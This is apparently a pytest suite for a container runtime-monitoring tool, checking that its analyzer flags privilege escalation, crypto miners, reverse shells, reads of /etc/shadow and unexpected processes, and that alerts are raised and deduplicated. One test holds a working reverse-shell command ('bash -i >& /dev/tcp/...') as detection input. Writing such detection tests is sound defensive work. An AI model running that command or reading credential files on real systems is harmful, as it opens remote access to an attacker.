"""Tests for runtime monitoring components."""

import asyncio
import json
import pytest
from datetime import datetime, timedelta, timezone
from src.runtime.ebpf_agent import RuntimeEvent, EBPFMonitorAgent
from src.runtime.analysis import (
    RuntimeBehaviorAnalyzer, Anomaly, AnomalyKind, ContainerBaseline,
)
from src.runtime.docker_monitor import DockerRuntimeCollector, ContainerSnapshot
from src.runtime.alerts import AlertManager
from src.runtime.service import RuntimeMonitoringService


# ---------------------------------------------------------------------------
# RuntimeEvent
# ---------------------------------------------------------------------------

class TestRuntimeEvent:
    def test_to_dict(self):
        evt = RuntimeEvent(
            event_type="syscall",
            container_id="abc123",
            severity="high",
            detail={"syscall": "execve", "comm": "sh"},
        )
        d = evt.to_dict()
        assert d["event_type"] == "syscall"
        assert d["container_id"] == "abc123"
        assert d["severity"] == "high"
        assert d["detail"]["comm"] == "sh"
        assert "timestamp" in d
        assert d["source"] == "ebpf_agent"


class TestRuntimeBackpressure:
    def test_invalid_event_limit_is_empty(self):
        agent = EBPFMonitorAgent()
        assert asyncio.run(agent.events("c1", limit=0)) == []

    def test_buffer_stats_expose_bounded_capacity(self):
        agent = EBPFMonitorAgent()
        stats = agent.buffer_stats()
        assert stats["buffer_capacity"] == 10_000
        assert stats["buffered_events"] == 0
        assert stats["dropped_events"] == 0


# ---------------------------------------------------------------------------
# Analysis engine
# ---------------------------------------------------------------------------

class TestRuntimeBehaviorAnalyzer:
    def _make_event(self, cid="c1", event_type="syscall", detail=None):
        return RuntimeEvent(
            event_type=event_type,
            container_id=cid,
            severity=None,
            detail=detail or {},
        )

    def test_process_syscall_event(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(detail={"syscall": "execve", "comm": "python3"})
        anomalies = analyzer.process_event(evt)
        # No anomaly for a standard process
        assert not anomalies
        baseline = analyzer._baselines["c1"]
        assert "python3" in baseline.unique_processes

    def test_privilege_escalation_detection(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(detail={"syscall": "setuid", "comm": "exploit"})
        anomalies = analyzer.process_event(evt)
        assert len(anomalies) == 1
        assert anomalies[0].kind == AnomalyKind.PRIVILEGE_ESCALATION
        assert anomalies[0].severity == "high"

    def test_crypto_mining_detection(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(detail={"syscall": "execve", "comm": "xmrig"})
        anomalies = analyzer.process_event(evt)
        assert any(a.kind == AnomalyKind.CRYPTO_MINING for a in anomalies)
        assert any(a.severity == "critical" for a in anomalies)

    def test_reverse_shell_detection(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(
            event_type="process",
            detail={"command": "bash -i >& /dev/tcp/10.0.0.1/4444"},
        )
        anomalies = analyzer.process_event(evt)
        assert any(a.kind == AnomalyKind.REVERSE_SHELL for a in anomalies)

    def test_file_anomaly_detection(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(
            event_type="file_access",
            detail={"path": "/etc/shadow"},
        )
        anomalies = analyzer.process_event(evt)
        assert any(a.kind == AnomalyKind.FILE_ANOMALY for a in anomalies)

    def test_get_resource_stats(self):
        analyzer = RuntimeBehaviorAnalyzer()
        b = analyzer._get_baseline("c1")
        b.cpu_samples.extend([10, 20, 15, 25, 12])
        b.mem_samples_mb.extend([512, 520, 515])
        b.unique_processes = {"nginx", "php-fpm"}
        stats = analyzer.get_resource_stats("c1")
        assert abs(stats["cpu"]["mean"] - 16.4) < 0.1
        assert stats["cpu"]["max"] == 25
        assert stats["cpu"]["count"] == 5
        assert stats["memory_mb"]["count"] == 3
        assert stats["unique_processes"] == 2

    def test_empty_resource_stats(self):
        analyzer = RuntimeBehaviorAnalyzer()
        assert analyzer.get_resource_stats("nonexistent") == {}

    def test_anomaly_callback(self):
        received = []
        analyzer = RuntimeBehaviorAnalyzer()
        analyzer.set_anomaly_callback(received.append)
        evt = self._make_event(detail={"syscall": "setuid", "comm": "bad"})
        analyzer.process_event(evt)
        assert len(received) == 1

    def test_clear_baseline(self):
        analyzer = RuntimeBehaviorAnalyzer()
        analyzer._get_baseline("c1")
        analyzer.clear_baseline("c1")
        assert "c1" not in analyzer._baselines

    def test_unexpected_process(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(
            event_type="process",
            detail={"command": "nmap"},
        )
        anomalies = analyzer.process_event(evt)
        assert any(a.kind == AnomalyKind.UNEXPECTED_PROCESS for a in anomalies)

    def test_get_anomalies_since(self):
        analyzer = RuntimeBehaviorAnalyzer()
        evt = self._make_event(detail={"syscall": "ptrace", "comm": "gdb"})
        analyzer.process_event(evt)
        since = datetime.now(timezone.utc) - timedelta(seconds=1)
        result = analyzer.get_anomalies(since=since)
        assert len(result) == 1


# ---------------------------------------------------------------------------
# Alert Manager
# ---------------------------------------------------------------------------

class TestAlertManager:
    def test_create_alert(self):
        mgr = AlertManager(min_alert_severity="medium")
        aid = mgr.create_alert(
            anomaly_type="crypto_mining", severity="critical",
            container_id="c1", title="Mining detected",
            description="xmrig process found",
            evidence={"comm": "xmrig"},
        )
        assert aid is not None
        assert "ALERT-" in aid

    def test_below_threshold(self):
        mgr = AlertManager(min_alert_severity="high")
        aid = mgr.create_alert(
            anomaly_type="test", severity="low",
            container_id="c1", title="Low severity", description="ok",
        )
        assert aid is None

    def test_dedup_cooldown(self):
        mgr = AlertManager(min_alert_severity="low", cooldown_seconds=60)
        a1 = mgr.create_alert("net", "medium", "c1", "T", "D")
        a2 = mgr.create_alert("net", "medium", "c1", "T", "D")
        assert a1 is not None
        assert a2 is None  # within cooldown

    def test_resolve_alert(self):
        mgr = AlertManager()
        aid = mgr.create_alert("test", "high", "c1", "T", "D")
        assert mgr.resolve(aid)
        alerts = mgr.list_alerts(unresolved_only=True)
        assert len(alerts) == 0
        alerts_all = mgr.list_alerts(unresolved_only=False)
        assert len(alerts_all) == 1

    def test_acknowledge(self):
        mgr = AlertManager()
        aid = mgr.create_alert("test", "high", "c1", "T", "D")
        assert mgr.acknowledge(aid)
        alerts = mgr.list_alerts(unresolved_only=False)
        assert alerts[0]["acknowledged"] is True

    def test_stats(self):
        mgr = AlertManager(min_alert_severity="low")
        mgr.create_alert("a", "high", "c1", "T", "D")
        mgr.create_alert("b", "medium", "c2", "T", "D")
        mgr.create_alert("c", "critical", "c1", "T", "D")
        s = mgr.stats()
        assert s["total"] == 3
        assert s["unresolved"] == 3
        assert s["by_severity"]["high"] == 1

    def test_filter_by_container(self):
        mgr = AlertManager(min_alert_severity="low")
        mgr.create_alert("a", "high", "c1", "T", "D")
        mgr.create_alert("b", "high", "c2", "T", "D")
        alerts = mgr.list_alerts(container_id="c1")
        assert len(alerts) == 1
        assert alerts[0]["container_id"] == "c1"

    def test_callback_fires(self):
        fired = []
        mgr = AlertManager()
        mgr.register_callback(fired.append)
        mgr.create_alert("test", "high", "c1", "T", "D")
        assert len(fired) == 1


# ---------------------------------------------------------------------------
# Docker Runtime Collector — parsing helpers
# ---------------------------------------------------------------------------

class TestDockerRuntimeCollector:
    def test_parse_size(self):
        from src.runtime.docker_monitor import _parse_size
        assert abs(_parse_size("123.4MiB") - 123.4 * 1024 ** 2) < 1
        assert abs(_parse_size("1.5GiB") - 1.5 * 1024 ** 3) < 1
        assert _parse_size("512kB") == 512_000
        assert _parse_size("0B") == 0

    def test_parse_pct(self):
        from src.runtime.docker_monitor import _parse_pct
        assert _parse_pct("25.5%") == 25.5
        assert _parse_pct("100%") == 100.0
        assert _parse_pct("invalid") == 0.0

    def test_container_snapshot_to_event(self):
        snap = ContainerSnapshot(
            container_id="abc",
            cpu_percent=42.5,
            mem_usage_mb=256,
            net_tx_bytes=1024,
        )
        evt = snap.to_resource_event()
        assert evt.event_type == "resource"
        assert evt.detail["cpu_pct"] == 42.5
        assert evt.detail["mem_mb"] == 256
        assert evt.detail["net_tx_bytes"] == 1024


# ---------------------------------------------------------------------------
# Service wiring test (no real Docker / DB required)
# ---------------------------------------------------------------------------

class TestRuntimeMonitoringService:
    def test_get_overview(self):
        mgr = RuntimeMonitoringService(
            db_persist=False, min_alert_severity="high")
        assert mgr.get_overview()["watched_containers"] == 0
        assert "alert_stats" in mgr.get_overview()

    def test_alert_integration_with_analyzer(self):
        """Analyzer anomalies should flow to alerts."""
        mgr = RuntimeMonitoringService(
            db_persist=False, min_alert_severity="medium")
        # Trigger a medium-severity anomaly via direct event
        evt = RuntimeEvent(
            event_type="process",
            container_id="c1",
            detail={"command": "nmap"},
        )
        mgr.analyzer.process_event(evt)
        # Analyzer callback sends to alert manager — but nmap is medium,
        # min is medium, so it should create an alert
        alerts = mgr.alert_manager.list_alerts(unresolved_only=False)
        # nmap triggers UNEXPECTED_PROCESS which is 'medium', at threshold
        assert len(alerts) >= 1
